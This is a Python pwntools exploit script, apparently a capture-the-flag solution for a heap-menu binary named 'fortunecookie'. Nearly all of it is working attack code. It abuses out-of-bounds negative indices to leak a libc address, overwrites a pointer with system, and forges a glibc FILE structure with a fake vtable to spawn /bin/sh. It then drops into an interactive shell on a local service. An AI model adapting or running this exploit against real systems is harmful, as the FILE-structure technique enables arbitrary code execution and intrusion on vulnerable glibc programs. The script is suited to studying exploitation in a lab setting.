from pwn import *
import subprocess
from argparse import ArgumentParser

from pwnlib.ui import pause

context.terminal = ['exo-open','--launch','TerminalEmulator']
# program = ["/Lib64/ld-2.23.so","./fortunecookie"]
program = ["./fortunecookie"]
libc_path = '/ibc/libc-2.23.so'
gdb_command = None
# gdb_command = 'c'

menu = '''==Fortune Cookie==
1. Eat one cookie!!
2. Make new cookie.
3. Edit cookie msg.
4. View cookie msg.
5. exit
==================
>'''
func = {
    'create':2,
    'edit':3,
    'show':4,
    'free':1
}

def create(size,content):
    p.sendlineafter(menu[-8:], str(func['create']))
    p.sendlineafter('?', str(size))
    p.sendafter(': ', content)

def edit(index,content):
    p.sendlineafter(menu[-8:], str(func['edit']))
    p.sendlineafter(': ', str(index))
    p.sendafter(': ', content)

def show(index):
    p.sendlineafter(menu[-8:], str(func['show']))
    p.sendlineafter(': ', str(index))
    return p.recvuntil(menu[:8])[:-8]

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct


def run_exploit():
    for i in range(27):
        create(0x18, 'a')
    edit(-4, 'a'*8)
    sleep(0.5)
    leak = u64(show(-4)[8:][:6]+'\0\0')
    
    libc_base = leak - libc.symbols['_IO_2_1_stderr_'] - 131
    print(hex(libc_base))
    edit(-4, p64(libc_base + libc.symbols['system']))
    
    _mode = 0x00000000ffffffff
    IO_buf = libc_base + libc.symbols['_IO_2_1_stdout_'] + 131
    stdin = libc_base + libc.symbols['_IO_2_1_stdin_']
    _lock = libc_base + libc.symbols['_IO_2_1_stderr_'] + 0x50
    _wide_data = _lock
    fake_vtable = libc_base + libc.symbols['_IO_2_1_stderr_'] - 0x38

    payload = pack_file(0,IO_buf,IO_buf,IO_buf,IO_buf,IO_buf,IO_buf,IO_buf-0x10,
        IO_buf+1,0,0,0,0,stdin,1,_lock,_wide_data,_mode)+p64(fake_vtable)
    edit(-8, "/bin/sh\0"+payload[8:])

def exploit(args) :
    context.arch = 'amd64'
    global libc
    global p
    global one

    if args['debug']:
        p = process(program)
        # p = process(program, env={"LD_PRELOAD":args['libc_path']})

        if args['libc_path'] != '':
            libc = ELF(args['libc_path'], checksec=False)

        if args['gdb_command']:
            gdb.attach(p,args['gdb_command'])

    else:
        host = 'localhost'
        port = 10106

        if args['libc_path'] != '':
            libc = ELF(args['libc_path'], checksec=False)
            
        p = remote(host, port)

    run_exploit()
    p.interactive()
    p.close()
    return 0

if __name__ == '__main__':

    parser = ArgumentParser()
    parser.add_argument('-r', help='nc to remote server', action='store_true')
    parser.add_argument('-g', '--gdb-command', help='enable gdb debug with start script', dest='gdb_command')
    parser.add_argument('-d', help='set log to debug level', action='store_true')
    parser.add_argument('-q', help='set log to quit level', action='store_true')
    args = parser.parse_args()
    
    if args.d:
        context.log_level = 'debug'
    if args.q:
        context.log_level = 'critical'

    if args.gdb_command != None:
        gdb_command = args.gdb_command.replace(';','\x0a')

    args = {'debug':args.r == False, 'gdb_command':gdb_command, 'libc_path':libc_path}
    while exploit(args):
        log.debug(args)